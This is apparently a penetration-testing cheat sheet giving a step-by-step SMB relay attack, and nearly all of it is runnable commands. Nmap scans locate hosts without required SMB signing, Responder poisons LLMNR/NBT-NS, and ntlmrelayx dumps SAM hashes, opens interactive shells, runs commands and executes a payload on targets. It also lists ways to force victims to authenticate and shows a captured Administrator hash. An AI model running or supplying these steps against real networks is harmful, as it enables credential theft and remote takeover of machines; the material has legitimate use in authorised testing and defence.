
Server Message Block (SMB) enables file sharing, printer sharing, network browsing, and inter-process communication (through named pipes) over a computer network. SMB serves as the basis for Microsoft's Distributed File System implementation.
## Step 1: Identify Hosts Without SMB Signing

```bash
# Scan for SMB signing disabled (vulnerable hosts)
nmap --script=smb2-security-mode -p 445 10.0.0.0/24

# Alternative scripts
nmap --script=smb-security-mode -p 445 10.0.0.0/24

# Single target
nmap --script=smb2-security-mode -p 445 10.0.0.25
```

**Look for:** `Message signing enabled but not required` = **VULNERABLE**

---

## Step 2: Create Targets File

```bash
# Add vulnerable hosts (signing disabled) to targets file
echo "10.0.0.25" > targets.txt
echo "10.0.0.30" >> targets.txt
```

---

## Step 3: Configure Responder

```bash
# Edit Responder config - DISABLE SMB and HTTP
sudo nvim /etc/responder/Responder.conf

# Set these to Off:
SMB = Off
HTTP = Off
```

---

## Step 4: Start Responder

```bash
# Run Responder (captures but doesn't handle SMB)
sudo responder -I eth0 -dwP
```

---

## Step 5: Run SMB Relay (ntlmrelayx)

```bash
# Basic relay - dumps SAM hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Get interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Execute command
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Run payload
sudo ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
```

---

## Step 6: Trigger Event (Wait/Force)

**Events that trigger authentication:**
- User browses to `\\attacker-ip`
- Outlook loading images
- SCF/URL file in share
- LLMNR/NBT-NS poisoning (Responder)

---

## Step 7: Capture Relayed Hashes

```
[*] SMBD-Thread-4: Received connection from 10.0.0.100
[*] Target: 10.0.0.25
[*] Authenticating against smb://10.0.0.25 as DOMAIN\admin SUCCEED
[*] Dumping SAM hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

---

## Quick Reference

| Tool                               | Purpose             |
| ---------------------------------- | ------------------- |
| `nmap --script=smb2-security-mode` | Find targets        |
| `responder`                        | Poison LLMNR/NBT-NS |
| `ntlmrelayx.py`                    | Relay captured auth |